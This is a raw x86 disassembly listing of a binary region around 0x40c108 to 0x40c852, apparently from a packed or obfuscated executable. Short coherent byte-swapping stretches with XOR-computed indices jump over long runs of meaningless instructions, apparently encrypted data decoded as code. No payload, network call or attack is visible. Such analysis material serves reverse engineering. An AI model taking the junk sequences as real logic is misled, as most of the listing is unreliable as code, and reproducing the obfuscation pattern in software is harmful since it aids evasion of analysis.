  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    cx,WORD PTR ds:[ebx]
  40c144:	and    esi,DWORD PTR [esi+0x77]
  40c147:	mov    esi,DWORD PTR cs:[eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c19f
  40c150:	inc    edx
  40c151:	pop    esi
  40c152:	mov    dl,0x72
  40c154:	push   ebp
  40c155:	xor    bl,BYTE PTR [ebx-0x5e879bea]
  40c15b:	mov    ds:0xd2d80be,al
  40c160:	shl    DWORD PTR [eax+0x26],cl
  40c163:	nop
  40c164:	push   es
  40c165:	sbb    eax,0xd024ea79
  40c16a:	cmp    al,0x62
  40c16c:	mov    BYTE PTR [edx],0xaf
  40c16f:	adc    BYTE PTR [ebp-0x1a],dl
  40c172:	rcl    BYTE PTR [eax],1
  40c174:	dec    eax
  40c175:	push   0xffffff88
  40c177:	hlt    
  40c178:	jbe    0x40c1c7
  40c17a:	fisub  WORD PTR [esi]
  40c17c:	push   cs
  40c17d:	sahf   
  40c17e:	retf   0x757d
  40c181:	out    0x41,eax
  40c183:	jmp    0xa1b1a457
  40c188:	xchg   esi,eax
  40c189:	je     0x40c1c5
  40c18b:	pop    edi
  40c18c:	jmp    0xe2ed:0x61412cd3
  40c193:	xchg   ecx,eax
  40c194:	xchg   BYTE PTR [eax-0x6f],al
  40c197:	(bad)  
  40c198:	cwde   
  40c199:	xchg   BYTE PTR [ebp-0x363be124],dl
  40c19f:	mov    BYTE PTR [edi+0x26302833],bl
  40c1a5:	cmp    al,0xa1
  40c1a7:	jl     0x40c1f5
  40c1a9:	sub    DWORD PTR [ebx-0x5595628b],eax
  40c1af:	adc    ah,BYTE PTR [edi]
  40c1b1:	call   0x28da:0x64ff612a
  40c1b8:	jp     0x40c1be
  40c1ba:	adc    ebp,ecx
  40c1bc:	in     eax,dx
  40c1bd:	and    DWORD PTR [ecx-0x69],edx
  40c1c0:	stos   DWORD PTR es:[edi],eax
  40c1c1:	mov    ds:0x2d1505c1,al
  40c1c6:	push   edi
  40c1c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1c8:	cmp    DWORD PTR [ecx-0x1c],edi
  40c1cb:	shl    DWORD PTR [eax],0xde
  40c1ce:	outs   dx,DWORD PTR ds:[esi]
  40c1cf:	or     al,0x97
  40c1d1:	xor    al,0x89
  40c1d3:	outs   dx,BYTE PTR ds:[esi]
  40c1d4:	sbb    dl,BYTE PTR [ebx+0x3f7720fb]
  40c1da:	adc    al,0xd6
  40c1dc:	in     eax,0x59
  40c1de:	shr    DWORD PTR [ebx-0x49],1
  40c1e1:	sahf   
  40c1e2:	jle    0x40c168
  40c1e4:	pop    ebp
  40c1e5:	adc    al,0x1f
  40c1e7:	(bad)  
  40c1e8:	std    
  40c1e9:	arpl   WORD PTR [eax-0x9],bp
  40c1ec:	xchg   ecx,eax
  40c1ed:	xor    eax,0x4f831758
  40c1f2:	cmp    eax,0xa846055e
  40c1f7:	push   ds
  40c1f8:	adc    cl,bl
  40c1fa:	push   es
  40c1fb:	imul   ecx,DWORD PTR [edx+0x341a7b55],0x64
  40c202:	rcl    DWORD PTR [esi-0x653ea875],cl
  40c208:	dec    esi
  40c209:	and    BYTE PTR [edx-0x74],dl
  40c20c:	cmp    al,0xa7
  40c20e:	retf   
  40c20f:	xchg   ebx,eax
  40c210:	shl    edx,cl
  40c212:	adc    esp,edi
  40c214:	dec    eax
  40c215:	out    0x74,eax
  40c217:	add    BYTE PTR [edx-0x1f],0x47
  40c21b:	fcmovne st,st(5)
  40c21d:	out    dx,eax
  40c21e:	mov    cl,0xed
  40c220:	jl     0x40c205
  40c222:	push   esi
  40c223:	ds xor al,0x2a
  40c226:	add    al,0x9
  40c228:	jmp    0x40c234
  40c22a:	mov    bh,0xcc
  40c22c:	rcl    DWORD PTR [ecx-0x3a94ec91],cl
  40c232:	mov    edi,0xa9f205ae
  40c237:	sar    BYTE PTR [edx+0x5e536a83],cl
  40c23d:	xor    eax,0x4e2b2dd4
  40c242:	and    eax,0x5aced015
  40c247:	push   es
  40c248:	adc    BYTE PTR [ecx],dh
  40c24a:	(bad)  
  40c24b:	icebp  
  40c24c:	loopne 0x40c2c7
  40c24e:	lahf   
  40c24f:	daa    
  40c250:	dec    esi
  40c251:	shl    DWORD PTR [esi-0x1187f595],cl
  40c257:	cmp    bl,dh
  40c259:	psadbw mm5,QWORD PTR [esi-0x3a]
  40c25d:	(bad)  
  40c25e:	in     eax,dx
  40c25f:	adc    DWORD PTR [ebp-0x5f],edx
  40c262:	adc    DWORD PTR [esi+0x329f80b0],ebx
  40c268:	pop    edi
  40c269:	scas   eax,DWORD PTR es:[edi]
  40c26a:	sub    DWORD PTR [eax+0x56],0x15
  40c26e:	leave  
  40c26f:	stc    
  40c270:	pop    eax
  40c271:	jno    0x40c233
  40c273:	inc    ebp
  40c274:	int3   
  40c275:	stc    
  40c276:	leave  
  40c277:	sub    al,0x30
  40c279:	sbb    ebp,DWORD PTR [esi-0x2]
  40c27c:	xchg   edi,eax
  40c27d:	lock (bad) 
  40c27f:	xchg   ebx,eax
  40c280:	call   0x9968:0x1f2c7dc8
  40c287:	fidiv  DWORD PTR [ebx+0x2b]
  40c28a:	sub    edi,DWORD PTR [eax-0x30]
  40c28d:	gs ret 
  40c28f:	enter  0x1875,0x68
  40c293:	xchg   ebp,eax
  40c294:	mov    fs,eax
  40c296:	das    
  40c297:	mov    ebp,edi
  40c299:	xchg   ebx,eax
  40c29a:	iret   
  40c29b:	imul   ebx,esp,0x7bb61d98
  40c2a1:	ret    
  40c2a2:	dec    edx
  40c2a3:	dec    edx
  40c2a4:	cmp    ebp,DWORD PTR [eax+0x6beddfe]
  40c2aa:	je     0x40c306
  40c2ac:	in     eax,dx
  40c2ad:	ins    DWORD PTR es:[edi],dx
  40c2ae:	mov    ecx,DWORD PTR [edi]
  40c2b0:	cmp    DWORD PTR [edi+0x2a],ecx
  40c2b3:	dec    esi
  40c2b4:	and    DWORD PTR [edx],esp
  40c2b6:	mov    cl,0x79
  40c2b8:	sub    al,0x21
  40c2ba:	push   esp
  40c2bb:	test   al,0x63
  40c2bd:	push   cs
  40c2be:	pop    ss
  40c2bf:	mov    ds,WORD PTR [eax]
  40c2c1:	push   es
  40c2c2:	pusha  
  40c2c3:	sti    
  40c2c4:	dec    ebx
  40c2c5:	aad    0xf4
  40c2c7:	fs xchg esi,eax
  40c2c9:	icebp  
  40c2ca:	push   ss
  40c2cb:	mov    bh,0x30
  40c2cd:	cmp    al,0x19
  40c2cf:	sbb    BYTE PTR [eax+edx*1],bh
  40c2d2:	add    ah,BYTE PTR ds:0x9eb253ca
  40c2d8:	pop    edi
  40c2d9:	xchg   ebx,eax
  40c2da:	jne    0x40c2fd
  40c2dc:	push   edx
  40c2dd:	fcom   DWORD PTR [ebp+0x32f681a]
  40c2e3:	pusha  
  40c2e4:	adc    eax,0xe4169fa7
  40c2e9:	bound  ecx,QWORD PTR [edx-0x46]
  40c2ec:	outs   dx,DWORD PTR ds:[esi]
  40c2ed:	sar    BYTE PTR [ebp+0x532ddb9b],0x59
  40c2f4:	jmp    0x819d:0x4deea
  40c2fb:	ret    0x7a6
  40c2fe:	fcomp  QWORD PTR [ebx-0x1a]
  40c301:	mov    dh,0xd1
  40c303:	mov    esp,0x96f3f7d4
  40c308:	dec    edx
  40c309:	mov    es,WORD PTR [ebx-0x5a]
  40c30c:	ror    DWORD PTR [edx+0x4e12ef56],0x15
  40c313:	push   ds
  40c314:	shl    DWORD PTR [ebp+0x35],1
  40c317:	jmp    WORD PTR gs:[edi+eax*1-0x23]
  40c31d:	and    eax,0x276c54eb
  40c322:	adc    eax,0xde9046eb
  40c327:	or     cl,bl
  40c329:	fiadd  DWORD PTR [eax+0xb13ac51]
  40c32f:	rcr    DWORD PTR [ebp-0x56],0x1e
  40c333:	ret    
  40c334:	xchg   edx,eax
  40c335:	add    BYTE PTR [eax+0x55c7dc7a],cl
  40c33b:	les    edi,FWORD PTR [ecx-0x50]
  40c33e:	xor    al,0x94
  40c340:	jecxz  0x40c340
  40c342:	pop    esp
  40c343:	ficom  DWORD PTR [esi+0xfe0967c]
  40c349:	lods   al,BYTE PTR ds:[esi]
  40c34a:	mov    ds:0x31affc57,eax
  40c34f:	(bad)  
  40c350:	iret   
  40c351:	jmp    0x3319f5a7
  40c356:	cli    
  40c357:	in     eax,dx
  40c358:	rol    DWORD PTR [ebx],0xc2
  40c35b:	dec    ebx
  40c35c:	outs   dx,DWORD PTR ds:[esi]
  40c35d:	test   BYTE PTR [eax+0x52],ch
  40c360:	scas   al,BYTE PTR es:[edi]
  40c361:	jecxz  0x40c35d
  40c363:	leave  
  40c364:	push   0x6f
  40c366:	fild   DWORD PTR [esi]
  40c368:	mov    ds:0xeef9cba6,al
  40c36d:	jle    0x40c32a
  40c36f:	or     edi,DWORD PTR [eax-0x76]
  40c372:	daa    
  40c373:	cwde   
  40c374:	mov    ah,0x8c
  40c376:	clc    
  40c377:	cwde   
  40c378:	rcr    BYTE PTR [ecx],1
  40c37a:	in     al,0xc6
  40c37c:	inc    esp
  40c37d:	js     0x40c368
  40c37f:	mov    edi,DWORD PTR [edx]
  40c381:	xchg   ebp,eax
  40c382:	pushf  
  40c383:	loop   0x40c3c6
  40c385:	enter  0x90d4,0xae
  40c389:	pushf  
  40c38a:	les    ebp,FWORD PTR ds:0xfd71fb96
  40c390:	mov    dl,0x47
  40c393:	clc    
  40c394:	dec    esp
  40c395:	dec    esp
  40c396:	jp     0x40c348
  40c398:	or     dl,BYTE PTR [edi+ebx*2+0x7a]
  40c39c:	lahf   
  40c39d:	cwde   
  40c39e:	xor    eax,0xc70bda09
  40c3a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3a4:	loopne 0x40c3ac
  40c3a6:	cmp    DWORD PTR [esi-0x53de92bf],edi
  40c3ac:	ja     0x40c367
  40c3ae:	outs   dx,BYTE PTR ds:[esi]
  40c3af:	inc    ecx
  40c3b0:	and    eax,0x893ec483
  40c3b5:	ja     0x40c41a
  40c3b7:	bswap  esp
  40c3b9:	lds    ecx,FWORD PTR [eax]
  40c3bb:	dec    ebx
  40c3bc:	popf   
  40c3bd:	ins    BYTE PTR es:[edi],dx
  40c3be:	das    
  40c3bf:	add    esi,esi
  40c3c1:	cdq    
  40c3c2:	pop    esi
  40c3c3:	int    0x6b
  40c3c5:	shl    ch,cl
  40c3c7:	and    esp,ebp
  40c3c9:	pop    ecx
  40c3ca:	out    0x9b,eax
  40c3cc:	xor    DWORD PTR [edi],ebp
  40c3ce:	mov    eax,ds:0x2471e77a
  40c3d3:	and    edx,eax
  40c3d5:	fidiv  WORD PTR fs:[esp+edi*4-0x899fcb9]
  40c3dd:	ins    DWORD PTR es:[edi],dx
  40c3de:	add    ecx,DWORD PTR [ebx-0x1129d813]
  40c3e4:	add    DWORD PTR [esi],0xffffffa6
  40c3e7:	pushf  
  40c3e8:	sbb    BYTE PTR [esi+0x6294c99b],bh
  40c3ee:	cmp    al,0x17
  40c3f0:	mov    esp,gs
  40c3f2:	add    ch,bh
  40c3f4:	cdq    
  40c3f5:	loopne 0x40c476
  40c3f7:	in     eax,0xf
  40c3f9:	cmp    ebp,DWORD PTR [esi]
  40c3fb:	cmp    BYTE PTR [edi+0x70ed80f1],dl
  40c401:	cli    
  40c402:	mov    eax,DWORD PTR ss:[ecx+ebx*2+0x451083ef]
  40c40a:	mov    bl,0x7
  40c40c:	xchg   DWORD PTR [ebp+0x14efc4e8],edx
  40c412:	repnz aad 0x82
  40c415:	ret    
  40c416:	sbb    eax,0xf12393c8
  40c41b:	mov    ah,0xcd
  40c41d:	xchg   ecx,eax
  40c41e:	dec    esp
  40c41f:	sbb    DWORD PTR [ecx-0x6a],edi
  40c422:	test   BYTE PTR [ebx-0x4abb44e8],0xdd
  40c429:	clc    
  40c42a:	add    ebp,DWORD PTR [edi+0x2aeb799f]
  40c430:	push   esi
  40c431:	inc    esp
  40c432:	je     0x40c3f1
  40c434:	pusha  
  40c435:	push   0xffffffa5
  40c437:	in     eax,dx
  40c438:	sub    al,0xa1
  40c43a:	arpl   WORD PTR [eax+0x4b],dx
  40c43d:	ret    0x58ed
  40c440:	or     dl,BYTE PTR [edx+0x484d8438]
  40c446:	popa   
  40c447:	fimul  DWORD PTR [eax-0x6da44539]
  40c44d:	dec    ecx
  40c44e:	mov    DWORD PTR [edx],edi
  40c450:	in     eax,dx
  40c451:	push   ebx
  40c452:	or     al,0xf5
  40c454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c455:	or     al,0x47
  40c457:	mov    ah,0xc0
  40c459:	adc    eax,0x2018b319
  40c45e:	or     BYTE PTR [edi+0xa1a3a01],bl
  40c464:	mov    WORD PTR [esi+ecx*2-0x6132abd],?
  40c46b:	into   
  40c46c:	arpl   WORD PTR [ebx-0x3e],di
  40c46f:	sbb    ebx,DWORD PTR [ecx-0x62]
  40c472:	push   edx
  40c473:	inc    eax
  40c474:	push   ds
  40c475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c476:	mov    ds:0x333c76f6,eax
  40c47b:	frstor [ebp+0x278c619a]
  40c481:	mov    ch,0xc4
  40c483:	sti    
  40c484:	sbb    eax,0x1d5ae19f
  40c489:	add    ebx,esi
  40c48b:	jmp    0xfb04:0x43a6e922
  40c492:	lds    ebx,FWORD PTR [edx+0x4a]
  40c495:	jmp    DWORD PTR [esi+0x21]
  40c498:	xchg   ebx,eax
  40c499:	or     bl,BYTE PTR [eax+0x55d0730b]
  40c49f:	and    BYTE PTR [ebx],ch
  40c4a1:	pop    edx
  40c4a2:	lahf   
  40c4a3:	add    eax,0x815959fd
  40c4a8:	cmp    esi,DWORD PTR [esi]
  40c4aa:	lods   al,BYTE PTR ds:[esi]
  40c4ab:	cld    
  40c4ac:	pop    ss
  40c4ad:	imul   esp,DWORD PTR [ebx+0x6c],0xfffffffc
  40c4b1:	shr    dh,cl
  40c4b3:	scas   al,BYTE PTR es:[edi]
  40c4b4:	out    dx,al
  40c4b5:	jle    0x40c4b7
  40c4b7:	cmc    
  40c4b8:	mov    eax,ds:0x40319dcf
  40c4bd:	sbb    BYTE PTR [ecx],ch
  40c4bf:	call   0xe76e3599
  40c4c4:	scas   al,BYTE PTR es:[edi]
  40c4c5:	out    0x36,eax
  40c4c7:	mov    ds:0x6fcf98d4,al
  40c4cc:	pop    eax
  40c4cd:	xor    BYTE PTR [edi],ah
  40c4cf:	add    eax,0xcafd64bf
  40c4d4:	dec    esp
  40c4d5:	push   edi
  40c4d6:	sbb    al,0x20
  40c4d8:	sbb    bh,BYTE PTR [esi-0x6f5ebfc3]
  40c4de:	xchg   esi,eax
  40c4df:	out    dx,eax
  40c4e0:	mov    ds:0xb2966ecc,al
  40c4e5:	ret    0x8e77
  40c4e8:	int    0x1d
  40c4ea:	cmp    eax,0x15ef1717
  40c4ef:	jmp    0x8bec:0x5503d033
  40c4f6:	jge    0x40c4dc
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	dec    edi
  40c541:	shl    BYTE PTR [ecx-0x13],1
  40c544:	dec    ebp
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c4df
  40c54d:	mov    ecx,0x36ebba9b
  40c552:	sub    al,0x9f
  40c554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c555:	retf   
  40c556:	popf   
  40c557:	sahf   
  40c558:	inc    edx
  40c559:	shl    dl,1
  40c55b:	cmp    ecx,DWORD PTR [edx+ecx*2+0x5a9d4222]
  40c562:	stos   BYTE PTR es:[edi],al
  40c563:	out    dx,al
  40c564:	or     al,cl
  40c566:	inc    edi
  40c567:	leave  
  40c568:	(bad)  
  40c569:	aas    
  40c56a:	inc    eax
  40c56b:	jmp    0x40c5be
  40c56d:	pop    ecx
  40c56e:	sub    DWORD PTR [ebp+edi*4+0x2c0b2713],edx
  40c575:	xchg   edx,eax
  40c576:	scas   eax,DWORD PTR es:[edi]
  40c577:	loopne 0x40c557
  40c579:	clc    
  40c57a:	lods   al,BYTE PTR ds:[esi]
  40c57b:	icebp  
  40c57c:	xchg   ecx,eax
  40c57d:	in     al,dx
  40c57e:	pop    ebx
  40c57f:	jmp    0x5f84:0x25ea7240
  40c586:	dec    esi
  40c587:	out    0x11,al
  40c589:	pop    esp
  40c58a:	daa    
  40c58b:	cmp    BYTE PTR [eax-0x73],bl
  40c58e:	jns    0x40c5b2
  40c590:	fcmovu st,st(2)
  40c592:	mov    eax,0x91d657bb
  40c597:	(bad)  
  40c598:	adc    eax,0xfc66fa39
  40c59d:	data16 jnp 0x40c5d0
  40c5a0:	call   0x6448:0xf7aa4721
  40c5a7:	xor    al,0x19
  40c5a9:	sub    al,0xbb
  40c5ab:	fisttp DWORD PTR [edi-0x45]
  40c5ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5af:	int    0xf4
  40c5b1:	ret    
  40c5b2:	dec    esp
  40c5b3:	inc    edx
  40c5b4:	add    al,0x63
  40c5b6:	test   BYTE PTR [edx+esi*2-0x1b],0xfb
  40c5bb:	xchg   ebp,eax
  40c5bc:	std    
  40c5bd:	pushf  
  40c5be:	jbe    0x40c608
  40c5c0:	xchg   edi,eax
  40c5c1:	inc    edi
  40c5c2:	inc    ecx
  40c5c3:	xchg   ecx,eax
  40c5c4:	cwde   
  40c5c5:	iret   
  40c5c6:	rcl    BYTE PTR ds:0x7573dadb,1
  40c5cc:	pop    ss
  40c5cd:	retf   
  40c5ce:	push   esp
  40c5cf:	call   0x6a49:0x53d12868
  40c5d6:	sub    dh,ah
  40c5d8:	dec    ebp
  40c5d9:	xchg   ebp,eax
  40c5da:	sar    ch,0xaf
  40c5dd:	jno    0x40c5f6
  40c5df:	aad    0x5
  40c5e1:	stos   DWORD PTR es:[edi],eax
  40c5e2:	imul   ebx,ebp,0xffffffd4
  40c5e5:	cmp    ebx,ebx
  40c5e7:	adc    dl,dh
  40c5e9:	mov    ebp,0x18ec4517
  40c5ee:	jno    0x40c598
  40c5f0:	jbe    0x40c5fc
  40c5f2:	inc    ebx
  40c5f3:	scas   al,BYTE PTR es:[edi]
  40c5f4:	push   edx
  40c5f5:	nop
  40c5f6:	add    eax,0x62978d56
  40c5fb:	sub    dh,BYTE PTR [edx+0x77]
  40c5fe:	pop    ecx
  40c5ff:	sbb    BYTE PTR [eax-0x45],0x4e
  40c603:	sub    eax,0x64237ec4
  40c608:	shl    ebx,cl
  40c60a:	jle    0x40c610
  40c60c:	shr    DWORD PTR [edi-0x3f6b179a],1
  40c612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c613:	or     esp,DWORD PTR [ebp-0x1534dbfd]
  40c619:	nop
  40c61a:	dec    edi
  40c61b:	push   edi
  40c61c:	mov    ch,0xd4
  40c61e:	adc    DWORD PTR [edi+0x46],ecx
  40c621:	ret    
  40c622:	(bad)  
  40c623:	call   0x7b081428
  40c628:	push   esi
  40c629:	mov    cl,0x72
  40c62b:	inc    eax
  40c62c:	leave  
  40c62d:	into   
  40c62e:	adc    ebx,DWORD PTR ds:0xb14deefd
  40c634:	fsubr  QWORD PTR [ebx+0x3021288]
  40c63a:	mov    dl,0x64
  40c63c:	(bad)  
  40c63d:	(bad)  
  40c63f:	data16 daa 
  40c641:	cmp    eax,0x8fe01eb6
  40c646:	test   DWORD PTR [ebx],edi
  40c648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c649:	js     0x40c639
  40c64b:	cld    
  40c64c:	and    ebx,DWORD PTR [ecx+0x3ddd8c26]
  40c652:	and    DWORD PTR [eax+eax*8],edx
  40c655:	mov    eax,0x72bd73bc
  40c65a:	adc    BYTE PTR [edi],0x86
  40c65d:	rcr    DWORD PTR [ebp+0x44],cl
  40c660:	mov    ch,0x43
  40c662:	pop    esi
  40c663:	ins    BYTE PTR es:[edi],dx
  40c664:	xor    ch,al
  40c666:	mov    edx,0xb75bf7a
  40c66b:	ss js  0x40c6a1
  40c66e:	hlt    
  40c66f:	cmp    al,0x46
  40c671:	daa    
  40c672:	mov    bl,0x26
  40c674:	enter  0x23c8,0x83
  40c678:	stos   BYTE PTR es:[edi],al
  40c679:	jl     0x40c6c5
  40c67b:	and    al,0x20
  40c67d:	in     al,dx
  40c67e:	fild   WORD PTR [edx+0x25]
  40c681:	(bad)  
  40c683:	pop    ds
  40c684:	inc    ebx
  40c685:	rcr    ebp,1
  40c687:	(bad)  
  40c688:	cwde   
  40c689:	fistp  DWORD PTR [ebx+0x5f55aeed]
  40c68f:	das    
  40c690:	js     0x40c638
  40c692:	jl     0x40c6fe
  40c694:	lds    eax,FWORD PTR [ebp+0x31]
  40c697:	je     0x40c6c8
  40c699:	fldenv [ecx+0x1c]
  40c69c:	jb     0x40c67e
  40c69e:	xlat   BYTE PTR ds:[ebx]
  40c69f:	inc    edx
  40c6a0:	test   BYTE PTR [edi],bl
  40c6a2:	mov    cl,0x5
  40c6a4:	adc    dl,BYTE PTR cs:[ebx+0x28]
  40c6a8:	xchg   ebp,eax
  40c6a9:	mov    ecx,0xd4e03d3d
  40c6ae:	cmp    ah,BYTE PTR [esi-0x4b]
  40c6b1:	repz cmc 
  40c6b3:	aaa    
  40c6b4:	jge    0x40c735
  40c6b6:	dec    edx
  40c6b7:	out    0x90,eax
  40c6b9:	shr    DWORD PTR [ebp+ebx*2-0x5f],1
  40c6bd:	out    0x29,eax
  40c6bf:	adc    eax,0xb16182e0
  40c6c4:	dec    ecx
  40c6c5:	dec    edx
  40c6c6:	lods   al,BYTE PTR ds:[esi]
  40c6c7:	xchg   ecx,eax
  40c6c8:	xchg   edi,eax
  40c6c9:	mov    ds:0x1e760779,al
  40c6ce:	cmc    
  40c6cf:	icebp  
  40c6d0:	pop    es
  40c6d1:	(bad)  
  40c6d4:	mov    BYTE PTR [edx-0x7476a204],bh
  40c6da:	xchg   esi,eax
  40c6db:	sbb    eax,0xed85eb48
  40c6e0:	and    al,0x2b
  40c6e2:	xchg   DWORD PTR [ebx-0x56a8fadb],esp
  40c6e8:	enter  0xc2d,0x81
  40c6ec:	xor    ebp,DWORD PTR [esi-0x3c]
  40c6ef:	mov    esi,0x5ba89e1d
  40c6f4:	push   0xffffffc3
  40c6f6:	sub    bh,BYTE PTR [eax]
  40c6f8:	cmp    ecx,DWORD PTR [edx-0x1]
  40c6fb:	je     0x40c74a
  40c6fd:	out    dx,al
  40c6fe:	popf   
  40c6ff:	mov    al,0x85
  40c701:	and    eax,0xa27e71c
  40c706:	mov    DWORD PTR [edx],edi
  40c708:	pushf  
  40c709:	mov    ch,0xdb
  40c70b:	adc    BYTE PTR [ebp-0x6],ch
  40c70e:	outs   dx,DWORD PTR ds:[esi]
  40c70f:	ss and esp,ecx
  40c712:	dec    eax
  40c713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c714:	inc    edx
  40c715:	mov    esp,0x4cf65ecb
  40c71a:	ss out 0xb2,al
  40c71d:	hlt    
  40c71e:	and    DWORD PTR [esi+0xc6262dc],esi
  40c724:	ja     0x40c701
  40c726:	add    al,0xb4
  40c728:	scas   al,BYTE PTR es:[edi]
  40c729:	mov    ah,0x70
  40c72b:	add    al,bh
  40c72d:	(bad)  
  40c72e:	call   0x3fd7c43b
  40c733:	pop    ecx
  40c734:	push   esp
  40c735:	dec    edx
  40c736:	or     edx,DWORD PTR [ecx+0x6e90de09]
  40c73c:	rol    DWORD PTR [esi],cl
  40c73e:	ss mov edi,ebp
  40c741:	or     BYTE PTR [ebx-0x50],dl
  40c744:	jl     0x40c78b
  40c746:	fiadd  WORD PTR [esi+0xf2503c0]
  40c74c:	or     dh,al
  40c74e:	xchg   esi,eax
  40c74f:	jecxz  0x40c716
  40c751:	jge    0x40c71d
  40c753:	out    0xa2,eax
  40c755:	shr    edx,cl
  40c757:	push   esp
  40c758:	and    DWORD PTR ds:0xaa30e104,esi
  40c75e:	xchg   DWORD PTR [eax-0x7dd2af46],ebx
  40c764:	(bad)  
  40c765:	jnp    0x40c75d
  40c767:	stos   BYTE PTR es:[edi],al
  40c768:	cmp    ebx,edx
  40c76a:	outs   dx,DWORD PTR ds:[esi]
  40c76b:	push   cs
  40c76c:	sub    ch,bl
  40c76e:	jno    0x40c705
  40c770:	add    ch,BYTE PTR [di+0x2d7]
  40c775:	sbb    DWORD PTR [eax-0x5b],0x25
  40c779:	dec    ecx
  40c77a:	outs   dx,BYTE PTR ds:[esi]
  40c77b:	mov    ch,0x14
  40c77d:	aam    0x69
  40c77f:	ret    
  40c780:	fidivr DWORD PTR [edx]
  40c782:	call   0x7e011ce4
  40c787:	js     0x40c76a
  40c789:	xor    eax,0x8d94f600
  40c78e:	fwait
  40c78f:	adc    cl,BYTE PTR [esi+eiz*4+0x7b]
  40c793:	push   ecx
  40c794:	mov    DWORD PTR [eax],ebx
  40c796:	or     esp,ebp
  40c798:	push   ebp
  40c799:	mov    esp,es
  40c79b:	addr16 addr16 jnp 0x40c72c
  40c79f:	jle    0x40c7d0
  40c7a1:	jl     0x40c74f
  40c7a3:	mov    bl,0xbc
  40c7a5:	cmp    ecx,DWORD PTR [edi+0x5]
  40c7a8:	or     BYTE PTR [esi-0x5ea4d202],dh
  40c7ae:	out    dx,eax
  40c7af:	push   cs
  40c7b0:	pop    ecx
  40c7b1:	sbb    BYTE PTR [eax],ch
  40c7b3:	inc    BYTE PTR [edi]
  40c7b5:	xor    al,0x27
  40c7b7:	shl    DWORD PTR [edi+eiz*1+0x5],0x20
  40c7bc:	iret   
  40c7bd:	or     eax,0x3bc6c552
  40c7c3:	jge    0x40c7f9
  40c7c5:	xchg   ecx,eax
  40c7c6:	test   eax,0x21eef480
  40c7cb:	imul   ecx,ebp,0x7f2b6451
  40c7d1:	cs gs xchg ebp,edi
  40c7d5:	and    eax,DWORD PTR [ecx-0x53]
  40c7d8:	rdtsc  
  40c7da:	push   edx
  40c7db:	repz sti 
  40c7dd:	ss adc ch,dh
  40c7e0:	ins    BYTE PTR es:[edi],dx
  40c7e1:	push   ecx
  40c7e2:	mov    ch,0xa5
  40c7e4:	jae    0x40c7ca
  40c7e6:	xchg   BYTE PTR es:0xd542ed12,ah
  40c7ed:	adc    bl,0x2d
  40c7f0:	xor    DWORD PTR [edx+edi*2],ebp
  40c7f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7f4:	loopne 0x40c7d7
  40c7f6:	pop    ds
  40c7f7:	mov    bh,0x16
  40c7f9:	push   eax
  40c7fa:	ret    
  40c7fb:	loopne 0x40c85d
  40c7fd:	popf   
  40c7fe:	pusha  
  40c7ff:	jns    0x40c7d7
  40c801:	call   FWORD PTR [edx+0x70]
  40c804:	lods   al,BYTE PTR ds:[esi]
  40c805:	cld    
  40c806:	sbb    edi,0x8a86cab1
  40c80c:	dec    esi
  40c80d:	add    edi,DWORD PTR [eax+0x5824a09c]
  40c813:	mov    dl,0x85
  40c815:	xor    eax,0x90eb8225
  40c81a:	jp     0x40c89a
  40c81c:	xchg   edi,eax
  40c81d:	ins    DWORD PTR es:[edi],dx
  40c81e:	outs   dx,BYTE PTR ds:[esi]
  40c81f:	cmp    BYTE PTR [edx+0x23],dh
  40c822:	call   0xa26a:0xf1800c3f
  40c829:	ret    
  40c82a:	push   eax
  40c82b:	lods   al,BYTE PTR ds:[esi]
  40c82c:	mov    ecx,0xc2e79dde
  40c831:	sub    edx,DWORD PTR [ebx+0x51]
  40c834:	adc    DWORD PTR [ebx-0x2b],0x818072dc
  40c83b:	call   0x3b74:0xdfe0cfcd
  40c842:	pushf  
  40c843:	scas   al,BYTE PTR es:[edi]
  40c844:	data16 mov al,ds:0xa13d2c0e
  40c84a:	add    BYTE PTR [ecx+0x289150a],dh
  40c850:	add    BYTE PTR [esi],dh
  40c852:	mov    BYTE PTR ds:0xc163f19,cl
